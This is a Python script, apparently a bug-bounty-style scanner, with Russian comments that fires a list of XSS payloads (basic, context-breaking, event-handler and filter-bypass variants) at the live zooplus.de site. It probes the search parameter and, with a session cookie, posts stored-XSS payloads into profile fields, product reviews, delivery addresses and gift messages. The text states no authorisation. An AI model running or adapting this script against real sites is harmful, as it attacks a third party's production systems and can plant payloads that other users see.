#!/usr/bin/env python3
"""
Полное XSS тестирование для Zooplus
Проверяет все точки ввода на XSS уязвимости
"""

import requests
from urllib.parse import quote
import json
from datetime import datetime

BASE_URL = "https://www.zooplus.de"

# XSS Payloads для тестирования
XSS_PAYLOADS = [
    # Basic payloads
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    
    # Breaking out of context
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "</script><img src=x onerror=alert(1)>",
    "</style><img src=x onerror=alert(1)>",
    
    # Event handlers
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    
    # Advanced
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    
    # Filter bypass
    '<ScRiPt>alert(1)</sCrIpT>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    '<img src=x onerror="al\x65rt(1)">',
    
    # CSS context
    '</style><script>alert(1)</script><style>',
    
    # Template literal
    '${alert(1)}',
    '{{alert(1)}}',
    
    # Data URIs
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
]


def test_search_xss():
    """Тест XSS в поиске"""
    print("\n[*] Testing XSS in search...")
    
    findings = []
    
    for payload in XSS_PAYLOADS[:5]:  # Test first 5 payloads
        try:
            # Test GET parameter
            search_url = f"{BASE_URL}/search?query={quote(payload)}"
            response = requests.get(search_url, timeout=10)
            
            # Check if payload is reflected unescaped
            if payload in response.text:
                print(f"[!] REFLECTED XSS in search: {payload}")
                findings.append({
                    "type": "Reflected XSS",
                    "location": "/search?query=",
                    "payload": payload,
                    "severity": "MEDIUM",
                    "cvss": "6.1"
                })
                break  # Found vulnerability, stop testing
            
        except Exception as e:
            print(f"[!] Error testing search: {e}")
    
    if not findings:
        print("[+] Search properly escapes input")
    
    return findings


def test_profile_xss(session_cookie):
    """Тест Stored XSS в профиле"""
    print("\n[*] Testing Stored XSS in profile...")
    
    if not session_cookie:
        print("[!] No session cookie provided, skipping profile XSS test")
        return []
    
    findings = []
    profile_url = f"{BASE_URL}/myaccount/api/profile/update"
    
    headers = {
        "Cookie": session_cookie,
        "Content-Type": "application/json"
    }
    
    # Test fields: firstName, lastName, address
    fields_to_test = ["firstName", "lastName", "companyName"]
    
    for field in fields_to_test:
        for payload in XSS_PAYLOADS[:3]:
            try:
                data = {
                    field: payload
                }
                
                response = requests.post(profile_url, json=data, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    # Check if it was saved
                    get_response = requests.get(f"{BASE_URL}/myaccount/profile", headers=headers, timeout=10)
                    
                    if payload in get_response.text and "<" in get_response.text:
                        print(f"[!!!] STORED XSS in profile field '{field}': {payload}")
                        findings.append({
                            "type": "Stored XSS",
                            "location": f"/myaccount/profile - {field}",
                            "payload": payload,
                            "severity": "HIGH",
                            "cvss": "7.5"
                        })
                        break
                    
            except Exception as e:
                print(f"[!] Error testing profile field {field}: {e}")
    
    if not findings:
        print("[+] Profile fields properly escape input")
    
    return findings


def test_review_xss(session_cookie):
    """Тест XSS в отзывах о товарах"""
    print("\n[*] Testing XSS in product reviews...")
    
    if not session_cookie:
        print("[!] No session cookie provided, skipping review XSS test")
        return []
    
    findings = []
    
    # Try to post a review with XSS payload
    review_url = f"{BASE_URL}/api/reviews/create"
    
    headers = {
        "Cookie": session_cookie,
        "Content-Type": "application/json"
    }
    
    for payload in XSS_PAYLOADS[:3]:
        try:
            data = {
                "productId": "12345",
                "rating": 5,
                "title": payload,
                "comment": payload
            }
            
            response = requests.post(review_url, json=data, headers=headers, timeout=10)
            
            if response.status_code in [200, 201]:
                print(f"[!] Review posted with payload: {payload}")
                print("[!] Check manually if XSS executes when viewing the review")
                findings.append({
                    "type": "Potential Stored XSS",
                    "location": "/api/reviews/create",
                    "payload": payload,
                    "severity": "HIGH",
                    "cvss": "7.5",
                    "note": "Manual verification required"
                })
                break
            
        except Exception as e:
            print(f"[!] Error testing reviews: {e}")
    
    return findings


def test_address_xss(session_cookie):
    """Тест XSS в адресах доставки"""
    print("\n[*] Testing XSS in delivery addresses...")
    
    if not session_cookie:
        print("[!] No session cookie provided, skipping address XSS test")
        return []
    
    findings = []
    address_url = f"{BASE_URL}/myaccount/api/addresses/add"
    
    headers = {
        "Cookie": session_cookie,
        "Content-Type": "application/json"
    }
    
    # Test address fields
    payload = '<img src=x onerror=alert(1)>'
    
    try:
        data = {
            "firstName": payload,
            "lastName": "Test",
            "street": payload,
            "city": payload,
            "zipCode": "12345",
            "country": "DE"
        }
        
        response = requests.post(address_url, json=data, headers=headers, timeout=10)
        
        if response.status_code in [200, 201]:
            print(f"[!] Address saved with XSS payload")
            print("[!] Check if payload executes in address display/PDF invoice")
            findings.append({
                "type": "Potential Stored XSS",
                "location": "/myaccount/api/addresses",
                "payload": payload,
                "severity": "HIGH",
                "cvss": "7.5",
                "note": "Check invoice PDFs and address display pages"
            })
        
    except Exception as e:
        print(f"[!] Error testing addresses: {e}")
    
    return findings


def test_gift_message_xss(session_cookie):
    """Тест XSS в gift messages"""
    print("\n[*] Testing XSS in gift messages...")
    
    if not session_cookie:
        print("[!] No session cookie provided, skipping gift message XSS test")
        return []
    
    findings = []
    
    # Gift message usually in checkout
    cart_url = f"{BASE_URL}/checkout/api/cart/gift-message"
    
    headers = {
        "Cookie": session_cookie,
        "Content-Type": "application/json"
    }
    
    payload = '<img src=x onerror=alert(1)>'
    
    try:
        data = {
            "message": payload,
            "from": payload,
            "to": payload
        }
        
        response = requests.post(cart_url, json=data, headers=headers, timeout=10)
        
        if response.status_code in [200, 201]:
            print(f"[!] Gift message saved with XSS payload")
            print("[!] Check if payload executes in order confirmation/email")
            findings.append({
                "type": "Potential Stored XSS",
                "location": "/checkout/api/cart/gift-message",
                "payload": payload,
                "severity": "HIGH",
                "cvss": "7.5",
                "note": "Check order emails and confirmation pages"
            })
        
    except Exception as e:
        print(f"[!] Error testing gift messages: {e}")
    
    return findings


def main():
    print("=" * 60)
    print("Zooplus Full XSS Testing")
    print(f"Time: {datetime.now()}")
    print("=" * 60)
    
    all_findings = []
    
    # Test 1: Search XSS (no auth required)
    findings = test_search_xss()
    all_findings.extend(findings)
    
    # For authenticated tests, you need to provide session cookie
    # Uncomment and add your session cookie here:
    # session_cookie = "session=YOUR_SESSION_COOKIE_HERE"
    session_cookie = None
    
    # Test 2: Profile XSS
    findings = test_profile_xss(session_cookie)
    all_findings.extend(findings)
    
    # Test 3: Review XSS
    findings = test_review_xss(session_cookie)
    all_findings.extend(findings)
    
    # Test 4: Address XSS
    findings = test_address_xss(session_cookie)
    all_findings.extend(findings)
    
    # Test 5: Gift message XSS
    findings = test_gift_message_xss(session_cookie)
    all_findings.extend(findings)
    
    # Summary
    print("\n" + "=" * 60)
    print("XSS TEST SUMMARY")
    print("=" * 60)
    
    if all_findings:
        print(f"\n[!!!] Found {len(all_findings)} XSS vulnerability(ies):\n")
        for i, finding in enumerate(all_findings, 1):
            print(f"{i}. {finding['type']} in {finding['location']}")
            print(f"   Payload: {finding['payload']}")
            print(f"   Severity: {finding['severity']} (CVSS: {finding['cvss']})")
            if 'note' in finding:
                print(f"   Note: {finding['note']}")
            print()
        
        # Save findings
        with open("reports/xss_findings.json", "w") as f:
            json.dump(all_findings, f, indent=2)
        print("[+] Findings saved to reports/xss_findings.json")
        
    else:
        print("\n[+] No XSS vulnerabilities found")
        print("[+] All tested inputs properly escape user data")
    
    return all_findings


if __name__ == "__main__":
    main()

